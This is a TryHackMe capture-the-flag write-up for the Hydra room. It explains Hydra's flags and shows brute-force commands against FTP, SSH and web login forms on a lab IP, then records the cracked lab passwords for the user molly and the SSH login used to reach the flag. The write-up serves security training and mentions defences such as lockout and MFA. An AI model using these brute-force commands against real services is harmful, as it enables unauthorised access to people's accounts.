# Tryhackme: Hydra

## What is Hydra? 
Hydra is an online brute-force password cracking tool used by penetration testers to crack login passwords.

## Why use Hydra?
Unlike offline tools like John-the-Ripper or Hashcat which cracks hashes, hydra cracks password in real-time, interrating with live network services to guess credentials. It is also incredibly fast as it can run mulitple parallel connections simultaneously.

----

## Common Hydra Flags:
These are the essential flags needed to be known to use hydra

1) **-l [username]** : Specifies a single username to target for credentials.
2) **-L [file_path_username]** : Specifies a wordlist of usernames to target.
3) **-p [password]** : Specifies a single password to the username list.
4) **-P [file_path_password]** : Specifies a wordlist of passwords eg.rockyou.txt
5) **-t [number]** : Number of parallel tasks to run. The default number is 16.
6) **-V** : Enables verbose mode to show the login attempts in real-time.
7) **-s [port_number]** : If the service is running on a different port than the defult one.
8) **-R** : To restore a session that has ben aborted or had a crash.

## Example Hydra Syntax:
To brute-force FTP with the username being user and using a password list such as rockyou.txt
**hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP**

To brute-force SSH password
**hydra -l <username> -P <path_to_password_list> MACHINE_IP -t 4 ssh

To brute-force a POST login form
**sudo hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path_to_login_page>:<login_credentials>:<invalid_response>"**
More concrete example: sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.163.211 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

To use -s and -V flag
**hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path_to_login_page>:<login_credentials>:<invalid_response>" -s <port> -V**

## Key Notes

* **Protocol Versatility:** Hydra isn't just for SSH or web logins. It supports over 50 protocols, including FTP, Telnet, MySQL, MS-SQL, SMB, and RDP. 
* **The "Success/Failure" Condition:** When cracking web forms (like a custom login webpage), Hydra doesn't automatically know if a login worked. We have to feed it a specific string to look for (e.g., `F=Login failed` or `S=Welcome`) so it knows when it successfully broke in.
* **Defensive Countermeasure:** In the real-world scenario, running Hydra with high threads (`-t 64`) is incredibly loud and will easily trigger standard Intrusion Detection Systems (IDS) or lock out user accounts. Security experts use it to prove why strong password policies and **Account Lockout Thresholds** or **Multi-Factor Authentication (MFA)** are critical.

## Room Task
**1) Find the password of molly and capture the flag.**

**Step 1:** I opened my browser and went to the login page to see how the interface works.

<img width="1919" height="864" alt="Screenshot 2026-06-17 131853" src="https://github.com/user-attachments/assets/4a3f61b2-bc59-4ed9-92bf-64c9a759d469" />

**Step 2:** Next I navigated through some directories to see the wordlists available and tried hydra POST command to find the password for the user molly.
Command used: $ ls
              $ cd /usr/share/wordlists
              $ cd ../../..
              $ sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.163.211 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
              
<img width="1919" height="805" alt="Screenshot 2026-06-17 132245" src="https://github.com/user-attachments/assets/0a2dac1d-9da6-4fa3-aa11-e7c339b405b2" />

**Step 3:** Then I used the obtained password to login to molly's account. Username: molly Password: sunshine

<img width="1919" height="810" alt="Screenshot 2026-06-17 132323" src="https://github.com/user-attachments/assets/4d6a1677-5d63-457b-ad64-bafceb42ce85" />

**2) Find the password of molly to connect through ssh**

**Step 1:** Tried the ssh hydra syntax to crack molly's ssh password.
Command used: hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.163.211 -t 4 ssh

**Step 2:** Used the gained password to access remote login to molly's system. Username: molly Password: butterfly
Command used: ssh molly@10.48.163.211

<img width="1900" height="824" alt="Screenshot 2026-06-17 133304" src="https://github.com/user-attachments/assets/721e77f4-1498-4247-972d-a85e9d2c705d" />

**Step 3:** After gaining access, I explored the system and gained the .txt file which contained the flag.
Commands used: $ ls
               $ cat flag2.txt

<img width="1902" height="429" alt="Screenshot 2026-06-17 133327" src="https://github.com/user-attachments/assets/b94fa2a0-28db-4c11-a85f-5c3fd67906bb" />
